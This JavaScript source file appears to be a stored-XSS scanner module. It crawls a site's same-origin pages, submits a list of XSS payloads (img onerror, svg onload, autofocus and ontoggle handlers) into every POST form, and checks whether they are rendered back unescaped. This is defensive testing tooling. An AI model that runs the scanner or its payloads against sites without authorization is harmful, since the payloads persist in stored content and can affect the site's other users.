/**
 * Stored XSS Detection Module (Fixed v2)
 *
 * Bug fixes in this version:
 * 1. isPayloadStoredUnescaped: detects HTML-encoded storage correctly by
 *    checking CONTEXT around the marker, not just raw string presence
 * 2. testFormForStoredXSS: also checks the POST response directly —
 *    guestbook pages often re-render immediately on submission
 * 3. Increased wait time to 2s for slow storage backends
 * 4. Crawler correctly passes pageUrl to testFormForStoredXSS as verify URL
 */

const axios = require("axios");
const cheerio = require("cheerio");
const { URL } = require("url");
const qs = require("querystring");

const USER_AGENT = "WebIntelX-StoredXSS-Scanner/1.0";
const TIMEOUT = 40000;

// Forms whose action URLs suggest reflected (not stored) behavior
const REFLECTED_FORM_PATTERNS = [
  /search/i,
  /query/i,
  /find/i,
  /lookup/i,
  /filter/i,
];

const STORED_XSS_PAYLOADS = [
  `<img src=x onerror=alert('STOREDXSS')>`,
  `<svg onload=alert('STOREDXSS')>`,
  `<input onfocus=alert('STOREDXSS') autofocus>`,
  `'\"><img src=x onerror=alert('STOREDXSS')>`,
  `<details open ontoggle=alert('STOREDXSS')>`,
];

function extractPostForms(html, baseUrl) {
  const forms = [];
  const $ = cheerio.load(html);

  $("form").each((_, form) => {
    const $form = $(form);
    const method = ($form.attr("method") || "get").toLowerCase();
    if (method !== "post") return;

    const action = $form.attr("action") || "";
    const formUrl = new URL(action || baseUrl, baseUrl).toString();

    const fields = {};
    $form.find("input, textarea, select").each((_, field) => {
      const $field = $(field);
      const name = $field.attr("name");
      const type = ($field.attr("type") || "text").toLowerCase();

      if (!name) return;
      if (["submit", "button", "reset", "image", "file"].includes(type)) return;

      if (type === "hidden") {
        fields[name] = { value: $field.attr("value") || "", isHidden: true };
      } else {
        fields[name] = { value: $field.attr("value") || "test", isHidden: false };
      }
    });

    // Skip forms that point to search/query endpoints (those are reflected XSS, not stored)
    const isReflectedForm = REFLECTED_FORM_PATTERNS.some(p => p.test(formUrl));
    if (isReflectedForm) {
      console.log(`[StoredXSS] Skipping likely-reflected form: ${formUrl}`);
      return;
    }

    const userFields = Object.entries(fields).filter(([, v]) => !v.isHidden);
    if (userFields.length > 0) {
      forms.push({ url: formUrl, fields, method });
    }
  });

  return forms;
}

/**
 * Checks if payload is stored AND executable (unescaped) in the HTML.
 *
 * The key challenge: sites like testphp store the marker text "STOREDXSS"
 * but inside HTML-encoded tags like &lt;img...&gt; which won't execute.
 * We need to distinguish:
 *   SAFE:    &lt;img src=x onerror=alert('STOREDXSS')&gt;  ← encoded, won't run
 *   VULN:    <img src=x onerror=alert('STOREDXSS')>        ← raw, will execute
 */
function isPayloadStoredUnescaped(html, payload) {
  const htmlStr = String(html || "");
  const marker = "STOREDXSS";

  // Quick exit: marker not present at all
  if (!htmlStr.toLowerCase().includes(marker.toLowerCase())) {
    return false;
  }

  // Case 1: Raw payload is directly present → definitely vulnerable
  if (htmlStr.includes(payload)) {
    return true;
  }

  // Case 2: Marker is present but payload is not raw.
  // Check if it's inside an HTML-encoded context by looking at surrounding chars.
  const markerIdx = htmlStr.toLowerCase().indexOf(marker.toLowerCase());
  const contextBefore = htmlStr.substring(Math.max(0, markerIdx - 100), markerIdx);

  // These indicate the marker is inside an encoded/escaped payload
  const encodingIndicators = ["&lt;", "&gt;", "&amp;", "&#x27;", "&#39;", "%3C", "%3E", "\\u003c"];
  if (encodingIndicators.some(enc => contextBefore.includes(enc))) {
    return false; // Safely encoded
  }

  // Marker present in non-encoded context (e.g. inside an attribute value without encoding)
  return true;
}

/**
 * Tests a single POST form for stored XSS.
 * Checks 3 places: submit response, fresh GET of source page, fresh GET of form action.
 */
async function testFormForStoredXSS(form, originalPageUrl) {
  const findings = [];

  for (const payload of STORED_XSS_PAYLOADS) {
    try {
      const submitData = {};
      for (const [name, meta] of Object.entries(form.fields)) {
        submitData[name] = meta.isHidden ? meta.value : payload;
      }

      console.log(`[StoredXSS] Submitting to ${form.url}: ${payload.substring(0, 40)}...`);

      const submitResponse = await axios.post(form.url, qs.stringify(submitData), {
        timeout: TIMEOUT,
        headers: {
          "User-Agent": USER_AGENT,
          "Content-Type": "application/x-www-form-urlencoded",
        },
        maxRedirects: 5,
        validateStatus: () => true,
      });

      if (submitResponse.status >= 500) continue;

      // === CHECK 1: Submit response (guestbooks often re-render on POST) ===
      if (submitResponse.status === 200 && isPayloadStoredUnescaped(submitResponse.data, payload)) {
        console.log(`[StoredXSS] ✅ Found in submit response: ${form.url}`);
        findings.push({
          location: form.url,
          payload,
          evidence: "Payload stored and rendered unescaped in POST response",
          confidence: "High",
        });
        break;
      }

      // Wait for server-side processing
      await new Promise(r => setTimeout(r, 2000));

      // === CHECK 2: Fresh GET of the page where form was found ===
      const verifyResponse = await axios.get(originalPageUrl, {
        timeout: TIMEOUT,
        headers: { "User-Agent": USER_AGENT },
        validateStatus: () => true,
      });

      if (verifyResponse.status === 200 && isPayloadStoredUnescaped(verifyResponse.data, payload)) {
        console.log(`[StoredXSS] ✅ Payload confirmed stored on: ${originalPageUrl}`);
        findings.push({
          location: form.url,
          payload,
          evidence: "Payload found stored in page response without proper encoding",
          confidence: "High",
        });
        break;
      }

      // === CHECK 3: Fresh GET of form action URL (if different from source page) ===
      if (form.url !== originalPageUrl) {
        const actionVerify = await axios.get(form.url, {
          timeout: TIMEOUT,
          headers: { "User-Agent": USER_AGENT },
          validateStatus: () => true,
        });

        if (actionVerify.status === 200 && isPayloadStoredUnescaped(actionVerify.data, payload)) {
          console.log(`[StoredXSS] ✅ Payload confirmed stored on action URL: ${form.url}`);
          findings.push({
            location: form.url,
            payload,
            evidence: "Payload found stored in form action page without proper encoding",
            confidence: "High",
          });
          break;
        }
      }

    } catch (err) {
      console.error(`[StoredXSS] Error testing form ${form.url}:`, err.message);
    }
  }

  return findings;
}

/**
 * Discovers internal links from a page (same origin only)
 */
function extractInternalLinks(html, baseUrl) {
  const links = new Set();
  const base = new URL(baseUrl);
  const $ = cheerio.load(html);

  $("a[href]").each((_, el) => {
    const href = $(el).attr("href");
    if (!href) return;
    try {
      const resolved = new URL(href, baseUrl);
      if (resolved.origin === base.origin && !resolved.pathname.includes("..")) {
        resolved.search = "";
        links.add(resolved.toString());
      }
    } catch {}
  });

  links.delete(baseUrl.replace(/\/$/, ""));
  links.delete(baseUrl.replace(/\/$/, "") + "/");

  return [...links].slice(0, 15);
}

/**
 * Main stored XSS scanner
 */
async function scanStoredXSS(inputUrl) {
  const url = (inputUrl.startsWith("http://") || inputUrl.startsWith("https://")) ? inputUrl : `http://${inputUrl}`;
  console.log(`[StoredXSS] Starting scan for: ${url}`);
  const findings = [];
  const visitedUrls = new Set([url]);

  try {
    const response = await axios.get(url, {
      timeout: TIMEOUT,
      headers: { "User-Agent": USER_AGENT },
      validateStatus: () => true,
    });

    if (response.status !== 200) {
      return {
        module: "Stored XSS",
        target: url,
        vulnerable: false,
        evidence: `Failed to fetch page: HTTP ${response.status}`,
        notes: "Unable to analyze page for stored XSS vulnerabilities",
      };
    }

    const pagesToScan = [{ pageUrl: url, html: response.data }];

    const internalLinks = extractInternalLinks(response.data, url);
    console.log(`[StoredXSS] Found ${internalLinks.length} internal link(s) to check for forms`);

    for (const link of internalLinks) {
      if (visitedUrls.has(link)) continue;
      visitedUrls.add(link);
      try {
        const linkRes = await axios.get(link, {
          timeout: TIMEOUT,
          headers: { "User-Agent": USER_AGENT },
          validateStatus: () => true,
        });
        if (linkRes.status === 200) {
          pagesToScan.push({ pageUrl: link, html: linkRes.data });
        }
      } catch {}
    }

    let totalForms = 0;
    for (const { pageUrl, html } of pagesToScan) {
      const forms = extractPostForms(html, pageUrl);
      totalForms += forms.length;
      if (forms.length > 0) {
        console.log(`[StoredXSS] Found ${forms.length} POST form(s) on ${pageUrl}`);
      }
      for (const form of forms) {
        // IMPORTANT: pass pageUrl (page where form was found) as verification URL
        const formFindings = await testFormForStoredXSS(form, pageUrl);
        findings.push(...formFindings);
      }
    }

    if (totalForms === 0) {
      return {
        module: "Stored XSS",
        target: url,
        vulnerable: false,
        evidence: "No POST forms found on page or linked pages",
        notes: "No testable POST forms found.",
      };
    }

  } catch (err) {
    console.error("[StoredXSS] Scan error:", err);
    return {
      module: "Stored XSS",
      target: url,
      vulnerable: false,
      evidence: "Scan failed due to error",
      notes: `Error: ${err.message}`,
    };
  }

  // Deduplicate findings by location — keep only first finding per unique endpoint
  const seen = new Set();
  const dedupedFindings = findings.filter(f => {
    const key = f.location;
    if (seen.has(key)) return false;
    seen.add(key);
    return true;
  });

  const vulnerable = dedupedFindings.length > 0;

  return {
    module: "Stored XSS",
    target: url,
    vulnerable,
    evidence: vulnerable
      ? dedupedFindings.map(f => ({
          location: f.location,
          payload: f.payload,
          evidence: f.evidence,
          confidence: f.confidence,
        }))
      : "No stored XSS vulnerabilities detected",
    notes: vulnerable
      ? "Stored XSS detected. User input is being stored and reflected without proper sanitization."
      : "No stored XSS vulnerabilities detected in tested POST forms.",
  };
}

module.exports = { scanStoredXSS };